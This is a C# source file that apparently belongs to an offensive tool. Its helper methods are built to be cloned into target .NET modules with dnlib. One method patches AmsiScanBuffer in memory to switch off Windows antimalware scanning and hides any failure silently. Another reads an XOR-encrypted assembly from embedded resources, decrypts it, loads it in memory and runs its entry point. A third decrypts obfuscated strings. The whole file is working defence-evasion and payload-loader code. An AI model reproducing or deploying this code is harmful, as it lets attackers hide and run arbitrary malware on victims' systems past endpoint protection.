// Reference methods compiled as plain C# — cloned into target modules at runtime via dnlib Importer.
// This avoids hand-written IL which is error-prone and produces InvalidProgramException.

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace DotnetWorker;

public static class PenumbraHelpers
{
    /// <summary>
    /// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
    /// This disables AMSI inspection of Assembly.Load(byte[]) payloads.
    /// </summary>
    public static void PatchAmsi()
    {
        try
        {
            var amsi = LoadLibrary("amsi.dll");
            if (amsi == IntPtr.Zero) return; // AMSI not loaded, nothing to patch

            var asb = GetProcAddress(amsi, "AmsiScanBuffer");
            if (asb == IntPtr.Zero) return;

            // mov eax, 0x80070057 (E_INVALIDARG — tells caller "no scan needed")
            // ret
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            VirtualProtect(asb, (uint)patch.Length, 0x40, out uint oldProtect);
            Marshal.Copy(patch, 0, asb, patch.Length);
            VirtualProtect(asb, (uint)patch.Length, oldProtect, out _);
        }
        catch
        {
            // Silently ignore — if patching fails, Assembly.Load will still work,
            // it just won't bypass AMSI
        }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static string Decrypt(string b64Data, string b64Key)
    {
        byte[] data = Convert.FromBase64String(b64Data);
        byte[] key = Convert.FromBase64String(b64Key);
        for (int i = 0; i < data.Length; i++)
            data[i] = (byte)(data[i] ^ key[i % key.Length]);
        char[] chars = new char[data.Length];
        for (int i = 0; i < data.Length; i++)
            chars[i] = (char)data[i];
        return new string(chars);
    }

    public static void LoadPayload(string[] args)
    {
        var asm = typeof(PenumbraHelpers).Assembly;
        var stream = asm.GetManifestResourceStream("payload.dat");
        var reader = new StreamReader(stream!);
        string payloadB64 = reader.ReadToEnd();
        stream = asm.GetManifestResourceStream("key.dat");
        reader = new StreamReader(stream!);
        string keyB64 = reader.ReadToEnd();
        byte[] enc = Convert.FromBase64String(payloadB64);
        byte[] key = Convert.FromBase64String(keyB64);
        byte[] plain = new byte[enc.Length];
        for (int i = 0; i < enc.Length; i++)
            plain[i] = (byte)(enc[i] ^ key[i % key.Length]);
        Assembly loaded = Assembly.Load(plain);
        MethodInfo? ep = loaded.EntryPoint;
        object[] invokeArgs = ep!.GetParameters().Length > 0
            ? new object[] { args }
            : Array.Empty<object>();
        ep.Invoke(null, invokeArgs);
    }
}
